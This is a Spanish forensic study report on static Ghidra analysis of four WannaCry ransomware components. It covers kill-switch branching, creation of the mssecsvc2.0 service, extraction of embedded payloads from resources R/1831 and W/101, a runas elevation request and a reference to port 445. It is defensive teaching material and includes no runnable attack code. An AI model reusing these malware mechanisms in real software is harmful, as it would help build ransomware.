# Parte práctica: examen estático de cuatro componentes de WannaCry con Ghidra

## 1. Propósito y resultados disponibles

Esta parte permite estudiar cómo se pasa de un archivo a una conclusión forense defendible. Integra cuatro capítulos por componente, diagramas, fragmentos de desensamblado y las 16 transcripciones de pseudocódigo preservadas. La autoría corresponde a los ocho autores de la portada; no se atribuyen actuaciones individuales que no estén registradas.

El resultado técnico disponible es **análisis estático seleccionado**. Se comprobaron identidades y relaciones de contenido y se revisaron ramas de funciones. No se ejecutó WannaCry ni se observó su impacto en un sistema. Las actividades que aún no se han realizado se presentan como procedimientos futuros, con criterios de aceptación, y no como resultados.

La secuencia de estudio es: método → identidad de los objetos → recursos y capas → lectura de cada componente → correlación de hallazgos → NIST → práctica benigna y revisión. El informe general contiene la reconstrucción histórica; esta parte explica cómo sostener las afirmaciones técnicas. Ambos documentos distinguen el NHS de Inglaterra de los archivos del laboratorio.

## 2. Método forense aplicado a la práctica

### 2.1 Recolección: registrar lo que realmente se tiene

Según SP 800-86, §3.1, el trabajo comienza identificando fuentes y preservando datos relevantes. En este caso se recibieron archivos ya presentes; no se adquirieron discos de hospitales. Deben registrarse identidad, ubicación, fecha de comprobación, responsable real, herramienta y relación con el caso. Si la procedencia previa es desconocida, se escribe «no acreditada».

Los originales se conservan sin edición. La extracción de un recurso produce un derivado con identidad propia y vínculo al padre. Una transcripción de Ghidra es otro derivado analítico: su hash no es el hash del ejecutable. La evidencia local se mantiene fuera del repositorio; la publicación académica contiene explicaciones y código seleccionado para lectura.

### 2.2 Examen: separar estructura de significado

Se comprueban cabeceras y recursos antes de confiar en el nombre del archivo. Después se localizan cadenas e importaciones, se siguen referencias y se contrastan las condiciones del desensamblado con el decompilado. El examinador conserva el resultado original y anota las correcciones de tipos o nombres. No modifica bytes del binario para obtener un pseudocódigo más cómodo.

### 2.3 Análisis: demostrar una afirmación por vez

Una ficha útil contiene pregunta, observación, dirección, condición, llamadas, retorno, soporte y limitación. Por ejemplo: «la rutina lee una longitud de cuatro bytes y pasa un puntero desplazado cuatro bytes a WriteFile» es una afirmación estática comprobable. «El archivo fue escrito y cifró un hospital» añade hechos que esa observación no demuestra.

### 2.4 Informe: permitir que otra persona compruebe el razonamiento

Cada capítulo incluye un procedimiento de lectura y preguntas resueltas. La revisión colectiva debe volver al hash y a la dirección, seguir ambas ramas y contrastar la fuente. Una firma de revisión solo se agrega cuando una persona real realizó esa revisión. No se completa una cadena de custodia ficticia para mejorar la apariencia de la entrega. [NIST SP 800-86, §§3.1–3.4]

## 3. Inventario, identidad y alcance

### 3.1 Identificadores completos

| Componente | SHA-256 |
|---|---|
| 24d004… | 24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c |
| ed01… | ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa |
| u.wnry | b9c5d4339809e0ad9a00d4d3dd26fdf44a32819a54abf846bb9b560d81391c25 |
| ec1383… | ec138352c4726fa3b6706b30bf4692252f818108c8066e8518920dd9823a34bb |
| PE delimitado dentro de W/101 | 93db4b26be3a4e6b724bf85830746f458cde613ad88501bcb23d2ae1ab9976c9 |

Los prefijos abreviados son etiquetas de lectura, no sustitutos de los identificadores completos. Coincidir por SHA-256 es una comprobación de identidad de contenido con alta confianza práctica; una comparación directa byte a byte es un procedimiento distinto. El comentario heredado de una transcripción que mezcla ambos términos se conserva como antecedente y se precisa aquí.

### 3.2 Cobertura real

| Objeto | Formato | Funciones reconocidas | Transcripciones seleccionadas |
|---|---|---|---|
| 24d004… | PE32 x86 | 176 | 6 |
| ed01… | PE32 x86 | 244 | 4 |
| u.wnry | PE32 x86 | 1.070 | 3 |
| ec1383… | PE32+ x64, DLL | 265 | 3 |
| Total de estos cuatro objetos | Distintos programas | 1.755 | 16 |

El proyecto también reconoció funciones en el PE de W/101, taskdl.exe y taskse.exe. No se suman a la tabla porque no son los cuatro objetos principales de esta entrega. Una función reconocida puede corresponder a lógica propia, bibliotecas, inicialización, manejo de errores, interfaz o auxiliares; esas clases requieren validación, no se asignan solo por el nombre.

La selección prioriza decisiones relevantes y relaciones verificables. Las demás funciones siguen existiendo. «No transcrita» no significa «inútil», «no ejecutada» o «no maliciosa». Tampoco se convierte la relación 16/1.755 en porcentaje de comportamiento cubierto: las funciones tienen complejidades y caminos diferentes.

### 3.3 Relaciones de contención

| Padre y recurso | Desplazamiento en archivo | Tamaño / contenido examinado |
|---|---|---|
| 24d004…, R/1831 | 204.964 bytes | 3.514.368 bytes; coincide con ed01… |
| ed01…, XIA/2058 | 65.776 bytes | 3.446.325 bytes; paquete ZIP de 36 miembros |
| ec1383…, W/101 | 51.364 bytes | Recurso de 5.242.880 bytes; longitud inicial de 3.756.032 |
| Tramo PE de W/101 | Recurso +4 | 3.756.032 bytes; SHA-256 93db4b26… |

Los desplazamientos anteriores son offsets de archivo documentados en la extracción. Las direcciones de funciones de Ghidra son direcciones virtuales del programa importado. No se intercambian ambos valores. El resto del recurso W/101, fuera de los cuatro bytes iniciales y la longitud declarada, no integra el PE delimitado.

## 4. Cómo leer las capas sin confundirlas

### 4.1 Bytes, formato PE y recursos

Un byte representa ocho bits. Hexadecimal permite escribir un byte con dos dígitos. PE es un formato de ejecutable de Windows que organiza cabeceras, secciones y directorios. La extensión del nombre no decide si es una DLL: hay que consultar la estructura. Un recurso PE es contenido incorporado que el programa puede localizar por tipo e identificador.

**W/101** significa «tipo W, identificador 101». La barra es notación del informe, no una carpeta, un puerto ni una división. 0x65 equivale a 101; 0x727 a 1831; 0x80a a 2058; 0x100 a 256; 0x1bd a 445. W y XIA son nombres de tipo elegidos en el archivo; no prueban por sí solos el formato de los datos.

Un DWORD ocupa cuatro bytes. En little-endian, el byte menos significativo aparece primero: `00 01 00 00` representa 256. Si un puntero tiene tipo DWORD*, sumarle uno avanza cuatro bytes. Si fuera un puntero a byte, sumarle uno avanzaría un byte. Por eso la aritmética del tipo debe contrastarse con el desplazamiento del desensamblado.

### 4.2 Cadenas, importaciones y referencias

Una cadena es un dato textual, no una acción. Una importación indica que el binario puede recurrir a una API; algunas APIs se resuelven dinámicamente con GetProcAddress y aparecen como llamadas indirectas. Una referencia cruzada enlaza una instrucción o dato con otro elemento. Seguirla permite mostrar cómo se utiliza una cadena y cuáles son las condiciones para alcanzar su uso.

Una ruta `C:\WINDOWS\mssecsvc.exe` explica un destino previsto. No demuestra que el archivo exista. Una referencia al nombre TaskStart indica búsqueda de un símbolo o destino; la instrucción `CALL EAX` indica una llamada indirecta al valor del registro. Ninguna revela, por sí sola, el cuerpo completo de la carga siguiente.

### 4.3 Desensamblado: instrucciones y saltos

El Listing muestra instrucciones recuperadas a partir de bytes. `MOV` mueve datos; `CALL` transfiere control a una rutina; `TEST` afecta indicadores de la CPU según una operación lógica; `JZ` y `JNZ` seleccionan caminos según el resultado. En `TEST EDI,EDI`, un valor cero activa la condición de cero. `JNZ` toma la salida cuando el resultado no es cero.

En x86 pueden verse argumentos colocados en la pila; en Windows x64 los primeros argumentos enteros o punteros se suelen observar en RCX, RDX, R8 y R9. Esto orienta la lectura, pero debe contrastarse con el convenio concreto y el prototipo. Un fragmento de Listing aislado no equivale al análisis completo de todos sus predecesores.

### 4.4 Decompilado: representación interpretativa

El Decompiler propone una representación semejante a C. `undefined4` indica cuatro bytes cuyo tipo semántico no se recuperó de manera más precisa; no significa «virus desconocido». `FUN_`, `DAT_` y `LAB_` son etiquetas automáticas comunes de función, dato y ubicación. Variables como `iVar1` son nombres generados, no los nombres del código fuente original.

Los errores de tipo afectan la lectura: un entero mal interpretado como puntero puede deformar parámetros. En 00407ce0 y 004014a6 hay limitaciones documentadas. Se conservan las transcripciones y se contrasta el Listing, sin reescribirlas para compilarlas. El propósito es comprender los caminos y su soporte, no reconstruir un ejecutable funcional.

### 4.5 Retorno, parámetro de salida y efecto

Un retorno de cero no tiene un significado universal. `memcmp == 0` expresa igualdad; un handle NULL puede indicar fallo; una rutina propia puede devolver cero tanto tras éxito como tras fallo. Una API puede devolver éxito y escribir otro resultado en un parámetro de salida. Finalmente, solicitar un proceso no acredita que terminara ni que alcanzara su objetivo. [API1–API4]

Estas distinciones explican buena parte del análisis: seguir solo el nombre de una función o su último return lleva a conclusiones incorrectas. Los cuatro capítulos muestran casos concretos.

## 5. Entorno de laboratorio y herramientas

<!-- ESTADO_LAB: el generador incorpora el estado comprobado desde estado_laboratorio.md. -->

### Estación existente incorporada el 20 de noviembre

El usuario confirmó disponer de una VM llamada «Windows 10» y autorizó usar una
copia aislada. La original estaba apagada, con un adaptador NAT, otro puente y
comparticiones globales del perfil habitual. Se realizó una clonación completa,
sin arrancar la original, hacia `local/vms/forense-nhs-win10-copia/`.

La copia se registró en el perfil VirtualBox e IPC privados del proyecto. Antes
del primer arranque se desactivaron los ocho adaptadores, portapapeles,
transferencia de archivos por portapapeles, arrastrar/soltar, USB y VRDE. Se retiró
la ISO de instalación de la copia y se conectó el DVD de herramientas ya existente.
Se creó el snapshot `aislada-antes-de-practica` antes de arrancar.

Se observó el escritorio y se abrió winver: **Windows 10 Pro, versión 1903,
compilación 18362.356**. Las capturas originales quedan en el expediente local,
fuera de Git. Este resultado acredita un sistema instalado en la copia; no una
instalación nueva realizada por el equipo ni una evaluación de sus parches,
licencia, limpieza o herramientas. No se ejecutó WannaCry.

| Objeto | Estado y uso |
|---|---|
| Windows 10, registro habitual | Original conservada; no utilizarla directamente para el caso |
| forense-nhs-win10-copia | Copia aislada con Windows observado; estación para lectura y ejercicios benignos |
| forense-nhs-win10 | VM vacía anterior, conservada y administrada con `./lab` |
| DVD de herramientas | Imagen anterior de 57 archivos; no incorpora automáticamente esta entrega |
| DVD de lectura de esta edición | `local/entrega-nist-lectura.iso`, medio separado con los documentos nuevos |

La copia conserva 4 CPU y 4 GiB de RAM del origen. Se comprobó su estado
apagado tras solicitar el cierre normal desde Windows; los registros permanecen
locales y la síntesis se incluye en `docs/verificacion.md`.
Las herramientas descargadas todavía requieren validación dentro de ese Windows.
El arranque del sistema no sustituye esa prueba.

Para comprobar y abrir la copia desde el anfitrión:

```bash
python3 scripts/check_isolation.py forense-nhs-win10-copia
./scripts/vbox-lab.sh showvminfo forense-nhs-win10-copia
./scripts/vbox-lab.sh startvm forense-nhs-win10-copia --type gui
```

El tercer comando inicia la copia: usarlo solo tras una comprobación correcta.
En el Explorador de Windows, abrir «Este equipo» y el DVD con etiqueta
`NHS_ESTUDIO`; contiene los dos PDF y Word. La letra de unidad puede variar.
La imagen se preparó y comprobó en el anfitrión y se conectó a la copia; no se
declara comprobada la apertura de los informes dentro del invitado.
Para abrir el administrador del registro aislado se puede utilizar
`./scripts/vbox-lab.sh --gui`. `./lab status` sigue consultando la VM vacía
anterior; no debe confundirse su estado con el de la copia. La copia no se adoptó
en los metadatos de Vagrant ni se cambió el significado de la box inicial.

La verificación posterior a esta preparación dio **18 pruebas correctas**, validó
el Vagrantfile y aprobó el aislamiento real tanto de la VM vacía como de la copia.
Esta comprobación evalúa configuración del hipervisor; no certifica ausencia de
escapes o contaminación previa. No se habilitaron comunicaciones para instalar
herramientas ni se distribuyeron discos o datos personales.


### 5.1 Herramientas y función en el estudio

| Herramienta | Para qué se utiliza | Estado y límite |
|---|---|---|
| Ghidra 12.2 DEV, anfitrión | Proyecto y exportaciones del 15/11 | Resultados preservados; sin nueva sesión MCP en esta edición |
| Ghidra 12.2 PUBLIC y JDK 25, paquetes Windows | Estación futura de lectura | Descargas fijadas; instalación en invitado requiere evidencia |
| Sysinternals | Observación de actividad benigna | No equivale a captura realizada |
| FLOSS | Examen de cadenas | No confundir texto extraído con ejecución |
| Wireshark | Lectura de capturas autorizadas | No se habilitan NICs para esta práctica |
| WinPmem y Volatility 3 | Adquisición y análisis de RAM, si se autorizan y prueban | Ninguna captura o análisis de RAM declarado aquí |

Las versiones y SHA-256 de descargas están en `config/descargas.lock.json`; SP 800-86 tiene manifiesto complementario. No se sustituyen silenciosamente paquetes. Una descarga correcta no demuestra que una herramienta funcione dentro de Windows. La compatibilidad y la prueba benigna deben documentarse por separado.

### 5.2 Preparación de una sesión estática

1. Leer alcance, identificar el objeto por hash y registrar la fecha real.
2. Comprobar aislamiento antes de usar la estación; guardar el resultado fuera de Git.
3. Trabajar sobre una copia autorizada, preservando originales y manifiestos.
4. Abrir el proyecto local conservado en Ghidra o consultar las transcripciones si no se dispone del proyecto.
5. Seleccionar el programa por hash, no solo por nombre. Abrir Listing y Decompiler.
6. Usar navegación a dirección y llegar a la función indicada en cada capítulo. Revisar sus referencias.
7. Anotar observación, camino alternativo y efecto que permanece pendiente.
8. Guardar exportaciones y registro real de la sesión, con versión de herramienta y hashes; publicar únicamente síntesis académica revisada.

El proyecto local está en `local/ghidra/proyectos/WannaCry_NHS.gpr`. Las exportaciones conservadas corresponden a `local/exportaciones-ghidra/20261115T175358527847Z/`. El lanzador y la consulta MCP están documentados en `docs/ghidra-mcp.md`. Que exista ese procedimiento no significa que el puente esté activo; en la comprobación de esta edición no escuchaba en 127.0.0.1:8765.

## 6. Análisis de 24d004…: decisión, servicio y carga

### Identidad, pregunta y evidencia

Este componente PE32 x86 tiene 3.723.264 bytes y SHA-256 24d004a104d4d54034dbcffc2a4b19a11f39008a575aa614ea04703480b1022c. La pregunta es cómo decide continuar y cómo se conecta con ed01…. El soporte son seis funciones seleccionadas, fragmentos de Listing y la relación del recurso R/1831. Las observaciones se refieren al programa importado en Ghidra, no a un proceso ejecutado.

### Decisión del kill switch: 00408140

La función copia una cadena y llama a InternetOpenA e InternetOpenUrlA. Guarda el resultado de esta última y lo compara con cero. Si es NULL, cierra handles según el código conservado y llama a 00408090. Si es no nulo, cierra los handles y evita esa llamada. Ambos caminos retornan cero. El bucle que copia la cadena no es una rutina de cifrado.

```text
0040819a  MOV EDI,EAX       ; resultado de InternetOpenUrlA
004081a3  TEST EDI,EDI      ; condición de cero
004081a5  JNZ 004081bc      ; no cero: evita la llamada
004081ad  CALL 00408090     ; camino de resultado cero
```

El Listing permite verificar la dirección de la rama. No debe invertirse la condición al explicarla: el camino NULL continúa hacia preparación. La API documenta el handle como resultado de apertura; esta función no consulta explícitamente un estado HTTP 200. Tampoco basta decir «con Internet se detiene»: el resultado depende de la operación concreta. [API1]

![Figura 4. Decisión en 00408140; ambos caminos retornan cero.](../figuras/24d004.png)

### Distribución por argumentos: 00408090 y 00407f20

00408090 obtiene la ruta del módulo y revisa la cantidad de argumentos. Cuando argc es menor que 2, llama a 00407f20 y vuelve. En el otro camino consulta el administrador de servicios, intenta abrir el servicio existente, llama a una auxiliar cuando obtiene un handle y prepara StartServiceCtrlDispatcherA con una referencia a LAB_00408000. La selección no permite describir una única secuencia que todos los argumentos recorran.

00407f20 llama primero a 00407c40 y después a 00407ce0. No hay una condición entre ambas llamadas que valide el resultado de la primera. Por tanto, un fallo de creación de servicio no demuestra que la rutina de extracción no se alcanzaría. A la inversa, que ambas se llamen no demuestra que ambas tengan éxito.

### Solicitud de servicio: 00407c40

La rutina prepara la línea asociada al módulo con el argumento observado `-m security`, abre el administrador de servicios y solicita crear `mssecsvc2.0`. Si obtiene el handle del servicio, solicita iniciarlo y cierra handles. El resultado de StartServiceA no gobierna un reporte específico de éxito en esta función; el retorno final es cero.

Esta observación permite orientar una investigación hacia un servicio, su ruta y los registros correspondientes. No demuestra un evento System 7045 adquirido ni un servicio instalado. El nombre «Microsoft Security Center» de la cadena es parte del dato del programa y no confirma legitimidad. Debe contrastarse el ejecutable y su contexto.

### Recurso R/1831: 00407ce0

La función resuelve dinámicamente varias APIs de kernel32 mediante GetProcAddress. Después localiza el recurso de tipo R y número 0x727, obtiene sus datos y tamaño, prepara rutas y solicita creación, escritura y proceso en los caminos correspondientes. Las comprobaciones del recurso son visibles; no todas las operaciones posteriores comprueban o comunican éxito.

```text
00407d69  PUSH 0x43137c     ; referencia al tipo R
00407d6e  PUSH 0x727        ; identificador 1831
00407d73  PUSH EBX          ; módulo cero en este camino
00407d74  CALL [0040a05c]   ; FindResourceA
```

El recurso empieza en offset 204.964 del archivo y mide 3.514.368 bytes. La extracción preservada coincide con ed01… según los cotejos documentados. Esta es una relación de contenido fuerte; no demuestra el momento de lanzamiento. Las llamadas indirectas y sprintf del decompilado tienen argumentos imperfectos, por lo que su lectura exige Listing. No se interpreta una variable automática como puntero confirmado solo por su posición en el C recuperado.

### Referencia a 445: 00407480

La constante 0x1bd equivale a 445 y aparece junto a llamadas de WS2_32 por ordinal. Se reconoce un contexto de comunicación de red. El nombre descriptivo del analista facilita navegación, pero no reemplaza la identificación de prototipos, parámetros y llamadas. Esta función seleccionada no constituye una demostración integral de EternalBlue ni una conexión observada.

### Evaluación de resultados y alternativas

| Pregunta | Resultado del examen | Evidencia que falta para un efecto real |
|---|---|---|
| ¿Qué rama continúa? | NULL conduce a 00408090 | Resultado de API durante una ejecución concreta |
| ¿Contiene ed01…? | R/1831 coincide con ese componente | Ninguna adicional para la relación documentada; sí para procedencia histórica |
| ¿Crea el servicio? | Hay una solicitud condicionada | Registro, configuración y contexto de ejecución |
| ¿Explota otro host? | Rutina con constante 445 e importaciones | Cadena completa y artefactos del host/red |

Para revisar, localizar el hash, abrir cada dirección, marcar precondiciones, contrastar TEST/JNZ y registrar la relación del recurso. No contactar el dominio ni ejecutar el componente. NIST: RS.AN-03 para el razonamiento, RS.AN-07 para identidad, DE.CM-09 para futuras fuentes de ejecución y GV.OV-01 para relacionar la lección histórica de supervisión.

**Conclusión del componente:** se comprueba una decisión y un mecanismo de preparación y extracción. La historia del NHS explica por qué esos mecanismos importan, pero su ocurrencia en un hospital específico no se deriva del código local.


## 7. Análisis de ed01…: paquete y frontera de carga

### Identidad, pregunta y evidencia

ed01… es PE32 x86, de 3.514.368 bytes, SHA-256 ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa. Coincide con el recurso R/1831 anterior. La pregunta es cómo organiza sus miembros y qué puede afirmarse sobre la carga siguiente. Se seleccionaron cuatro funciones de 244 reconocidas; no se reconstruyó toda la criptografía.

### Acceso al paquete: 00401dab

La rutina localiza el tipo XIA e identificador 0x80a, carga y bloquea el recurso y obtiene el tamaño. Pasa datos a una auxiliar y, si obtiene un resultado válido, consulta y recorre entradas. Cuando la entrada se llama c.wnry y GetFileAttributesA informa un valor válido, evita la extracción de esa entrada. En otras condiciones solicita la operación de extracción mediante una auxiliar.

```text
00401db6  PUSH 0x40f43c     ; tipo XIA
00401dbb  PUSH 0x80a        ; identificador 2058
00401dc0  PUSH [EBP+0x8]    ; módulo
00401dc3  CALL [00408100]   ; FindResourceA
00401dcb  TEST ESI,ESI
00401dcd  JZ 00401e07       ; salida de fallo
```

El formato ZIP no se deduce del nombre XIA: procede del examen del contenido, estructura y comprobaciones de CRC de la extracción estática. El paquete mide 3.446.325 bytes y tiene 36 miembros. Que la rutina termine con 1 tras cerrar el paquete no prueba que cada archivo se escribiera; incluso un conteo sin entradas puede alcanzar ese retorno. [API2; manifiesto local]

### Preparación y caminos: 00401fe7

La función tiene una rama inicial especial asociada a cantidad y contenido de argumentos. En ciertas condiciones intenta copiarse como tasksche.exe y puede retornar antes de la preparación principal. El informe no elimina esa salida para dibujar una secuencia más simple.

El camino posterior establece un directorio de trabajo, llama a auxiliares y a la extracción del paquete. Solicita operaciones externas de atributos y permisos mediante 00401064 con espera cero. El código no comprueba aquí el resultado de todas esas operaciones antes de continuar. Un orden de llamadas no garantiza que procesos externos hayan terminado en ese mismo orden.

Después aparecen condiciones sobre auxiliares de preparación, lectura de t.wnry, procesamiento posterior y obtención de un destino asociado a TaskStart. Solo si esas condiciones permiten continuar se realiza la llamada indirecta. Los nombres de auxiliares automáticos no constituyen una explicación de sus cuerpos.

![Figura 5. Preparación y condiciones principales hacia la llamada indirecta; las condiciones agrupadas se explican en el texto.](../figuras/ed01.png)

El primer rombo resume la rama especial inicial completa: cantidad de argumentos, comparación y resultados auxiliares. El rombo posterior resume comprobaciones sucesivas; no significa una sola API. El decompilado íntegro del anexo permite revisar cada condición individual.

### Auxiliar de proceso: 00401064

La función solicita CreateProcessA y devuelve cero si la creación falla. Si se informa éxito, solo espera cuando el segundo parámetro es distinto de cero. Dentro de ese bloque, un resultado de espera distinto de cero conduce a solicitar TerminateProcess y, si existe el tercer parámetro, consultar el código de salida. Finalmente cierra handles y devuelve 1.

No se debe traducir «retorno 1» como «permisos cambiados». Ese valor describe el resultado de esta auxiliar, no el efecto final del programa externo. Los usos con espera cero tampoco esperan el cierre del proceso. Las condiciones pueden entenderse leyendo los parámetros concretos del llamador, no únicamente el cuerpo de la auxiliar. [API3]

### t.wnry y la frontera del análisis: 004014a6

El archivo observado tiene 65.816 bytes. Su cabecera comienza por ocho bytes WANACRY! y después `00 01 00 00`, que corresponde a 256 en little-endian. La rutina abre el archivo, comprueba tamaño y cabecera, lee campos, reserva memoria y recurre a auxiliares de transformación. En memcmp, cero significa igualdad, a diferencia de los controles de handle nulo.

La transcripción muestra un prototipo __thiscall y parámetros que requieren revisión contra el Listing. No se cambia el convenio de llamada para obtener código compilable. El campo 0x100 no demuestra por sí solo RSA ni una clave concreta; ese significado requiere seguir los datos y los auxiliares.

```text
00402125  PUSH 0x40f4f4     ; referencia a t.wnry
0040212d  CALL 004014a6     ; lectura y procesamiento
00402154  JZ 0040215a       ; evita llamada si destino es cero
00402158  CALL EAX          ; destino indirecto, no cuerpo del cifrador
```

La decompilación permite reconocer la búsqueda y llamada condicionada hacia una carga. No aporta aquí la DLL final reconstruida ni el cuerpo íntegro de TaskStart. Un paquete con contraseña, un contenedor transformado y el cifrado de documentos son capas distintas; no se equiparan sus claves o funciones.

### Evaluación y relación con NIST

El hallazgo más fuerte es la relación entre recurso, paquete y miembros, junto con las condiciones que limitan la llamada indirecta. La confianza es alta en los bytes y referencias preservados; el resultado de ejecución permanece no observado. Una ausencia de salida en un entorno externo podría tener varias explicaciones y no se resuelve con este decompilado.

Para estudiar, dibujar el árbol padre-hijo, anotar el tratamiento de c.wnry, separar las llamadas asíncronas y marcar la frontera TaskStart. La ampliación debe revisar los auxiliares de transformación y convenios de llamada antes de caracterizar el cifrador. NIST SP 800-86 organiza el examen; RS.AN-06 y RS.AN-07 requieren conservar actuación, identidad, datos y procedencia.

**Conclusión del componente:** ed01… organiza y prepara un paquete con un camino condicionado hacia otra carga. El análisis no demuestra el éxito de todas las extracciones, los efectos de los comandos ni la ejecución completa del cifrador.


## 8. Análisis de u.wnry: referencias, privilegios y recuperación

### Identidad, pregunta y evidencia

u.wnry tiene SHA-256 b9c5d4339809e0ad9a00d4d3dd26fdf44a32819a54abf846bb9b560d81391c25 y procede del paquete de ed01…. Es un PE32 x86 con 1.070 funciones reconocidas. Aquí se estudian tres auxiliares y el Listing que las conecta con una cadena contra mecanismos de recuperación.

La pregunta es qué relación existe entre el dato textual, la consulta de privilegios y la solicitud de proceso. No se pretende caracterizar todas las funciones de interfaz o descifrado a partir de esos tres cuerpos. El bloque principal que referencia la cadena no tiene una función contenedora correctamente recuperada en este proyecto; no se dispone de su decompilación completa.

### Del dato a su referencia

La cadena de interés está en 00420fd8 y agrupa operaciones contra copias sombra, catálogo y opciones de recuperación. Se describe su finalidad analítica sin ofrecerla como comando de práctica. Una cadena sin referencia podría ser dato no utilizado; aquí se conserva un camino de referencias hacia código.

```text
004066fe  MOV ESI,0x420fd8   ; dirección del dato
0040670c  MOVSD.REP         ; copia
0040672f  CALL 00401bb0     ; consulta de token
00406736  JNZ 00406750     ; selección de ruta
00406746  CALL 00401b50    ; auxiliar ShellExecuteExA
0040677c  CALL 00401a90    ; auxiliar CreateProcessA
```

Las condiciones anteriores al fragmento también pueden afectar su alcance. El Listing demuestra instrucciones y relaciones, no que el bloque se ejecutara. Un fallo del Decompiler no significa ausencia de código ni autoriza a inventar una función C para completar el informe.

### Consulta del token: 00401bb0

La función construye el SID correspondiente al grupo de administradores y consulta CheckTokenMembership. Distinguir dos resultados es esencial: BVar1 informa si la API pudo realizar la consulta; local_10 recibe el resultado de pertenencia habilitada. Si falla la construcción del SID o la consulta, la auxiliar termina con cero; también puede retornar cero tras una consulta negativa. [API4]

El flujo del llamador selecciona una ruta según ese retorno. Un valor no cero conduce hacia la auxiliar de creación de proceso; el camino cero hacia la auxiliar de ShellExecuteExA. No debe afirmarse que todo cero significa exclusivamente «usuario no administrador»: también puede representar una falla de consulta.

![Figura 6. Selección de auxiliares en el fragmento de u.wnry; las condiciones anteriores no se representan.](../figuras/u_wnry.png)

### Solicitud con runas: 00401b50

Esta auxiliar llena una estructura SHELLEXECUTEINFOA, coloca los parámetros recibidos y utiliza el verbo runas al solicitar ShellExecuteExA. El dato explica una solicitud de ejecución con elevación, no una elevación concedida. Falta evidencia de contexto del usuario, respuesta del sistema y proceso resultante para afirmar su efecto real.

La expresión booleana del decompilado se preserva literalmente en el anexo. No se simplifica silenciosamente como una garantía de éxito, y no se atribuye a la biblioteca una vulnerabilidad de elevación solo por ver el verbo runas.

### Creación y espera: 00401a90

La auxiliar prepara estructuras, solicita CreateProcessA y devuelve cero ante fallo. Cuando el segundo parámetro es no cero, espera y puede solicitar terminación si el resultado de espera no es cero. Si hay parámetro de salida, consulta el código del proceso dentro de ese bloque. Después cierra handles y retorna 1.

Hay tres hechos distintos: la API informa creación, el proceso puede terminar, y la acción externa puede conseguir un cambio. Esta auxiliar no acredita los tres. Una solicitud de terminación tampoco demuestra que la orden prevista hubiera terminado antes. El valor de retorno no es una medición del estado de copias de respaldo.

### Qué explica y qué no explica para el NHS

El mecanismo hace relevante estudiar la capacidad de recuperación. La relación es conceptual y preventiva: una organización necesita copias protegidas y verificadas ante acciones que puedan obstaculizar restauración. No se afirma que todos los respaldos del NHS se borraran, que esta ruta alcanzara cada equipo ni que los permisos se concedieran. Esos hechos necesitarían artefactos de cada entorno.

| Nivel de evidencia | Afirmación admisible |
|---|---|
| Cadena | Existe texto con operaciones potencialmente perjudiciales para recuperación |
| Referencia y Listing | Hay instrucciones que acceden al texto y llaman a auxiliares |
| Auxiliar | Puede solicitar un proceso bajo condiciones determinadas |
| Ejecución real | Pendiente: necesitaría procesos y tiempos comprobados |
| Efecto real | Pendiente: necesitaría estado de recuperación antes/después |

NIST: PR.DS-11 justifica copias mantenidas y probadas; RC.RP-03 pide verificar su aptitud antes de usarlas y RC.RP-05 verificar el funcionamiento después. Un snapshot de laboratorio no debe confundirse con la estrategia institucional de respaldo.

**Conclusión del componente:** se observa una conexión estática entre datos y solicitudes de proceso relevantes para recuperación. La decompilación incompleta del llamador y la falta de ejecución impiden afirmar el efecto final. Para ampliar el estudio hay que recuperar límites y flujo del bloque sin modificar el binario original.


## 9. Análisis de ec1383…: W/101 y solicitud de lanzamiento

### Identidad, pregunta y evidencia

El archivo ec1383… tiene 5.298.176 bytes y SHA-256 ec138352c4726fa3b6706b30bf4692252f818108c8066e8518920dd9823a34bb. Su estructura es PE32+ x64, DLL, aunque el nombre recibido termine en .exe. La extensión es una etiqueta; la cabecera decide la interpretación del formato.

La pregunta es cómo extrae y solicita lanzar una carga y qué relación comprobada tiene con los demás. Se examinan PlayGame, la extracción de W/101 y la auxiliar de proceso. No se conoce aquí qué mecanismo externo invocó la exportación ni si ocurrió en un hospital o sandbox.

### PlayGame: 1800011a4

La exportación forma la ruta global `C:\WINDOWS\mssecsvc.exe`. Llama a 180001014 y luego a 1800010f8, retornando cero. Las instrucciones en 1800011c9 y 1800011ce son llamadas consecutivas; no aparece entre ellas una prueba del resultado de extracción.

La consecuencia es precisa: una devolución de fallo de la primera rutina no impide por sí misma que el llamador solicite la siguiente. Eso no garantiza que exista un archivo válido para lanzar. La presencia de PlayGame en la tabla de exportaciones tampoco demuestra que se haya invocado. La práctica no necesita ejecutar la DLL para responder estas preguntas.

### W/101, desde cero

W es el tipo del recurso y 101 su identificador decimal; en las instrucciones se ve 0x65. FindResourceA utiliza módulo, nombre/identificador y tipo. Obtener la referencia al recurso no equivale a ejecutar su contenido; después se consulta el bloque y se interpretan sus datos. [API2]

```text
Recurso W/101: 5.242.880 bytes
+0 a +3       DWORD little-endian: longitud 3.756.032
+4            Inicio del PE delimitado
+4 a +3756035 Tramo de 3.756.032 bytes que se pretende escribir
Después       Bytes restantes del recurso, fuera de ese tramo
```

El análisis externo verifica que el intervalo esté dentro del recurso y calcula su hash. Esta validación del extractor no debe atribuirse al malware: la rutina seleccionada usa la longitud inicial sin mostrar una comprobación completa de sus límites frente al tamaño del recurso.

### Extracción: 180001014

La rutina realiza comprobaciones iniciales de FindResourceA, LoadResource, LockResource y tamaño distinto de cero. Si alguna falla, retorna cero. Después lee el DWORD inicial, solicita abrir el archivo de destino y, si el handle es válido, solicita escribir desde recurso+4 con la longitud leída. Cierra el archivo y llega al retorno 1.

```text
18000102a  LEA R8,[1800092b0]  ; tipo W, tercer argumento
180001031  MOV EDX,0x65       ; identificador 101
180001036  CALL [180009030]   ; FindResourceA
18000108b  MOV ESI,[RDI]      ; DWORD de longitud
1800010c4  LEA RDX,[RDI+4]    ; inicio del contenido
1800010cd  MOV R8D,ESI        ; longitud para WriteFile
1800010d3  CALL [180009008]   ; solicitud de escritura
```

En el C recuperado, pDVar2 es DWORD*. `*pDVar2` lee el campo y `pDVar2 + 1` avanza cuatro bytes, como confirma LEA con +4. La rutina copia; no hay una operación de descifrado en el tramo examinado.

![Figura 7. Extracción de W/101: el retorno 1 no garantiza una escritura correcta.](../figuras/ec1383.png)

El hallazgo decisivo está en el manejo de errores. Tras superar los controles iniciales, si CreateFileA falla, se omite WriteFile y aun así se retorna 1. Cuando WriteFile se alcanza, su resultado tampoco gobierna el retorno. Por ello, etiquetar el retorno 1 como «extracción exitosa» sería incorrecto.

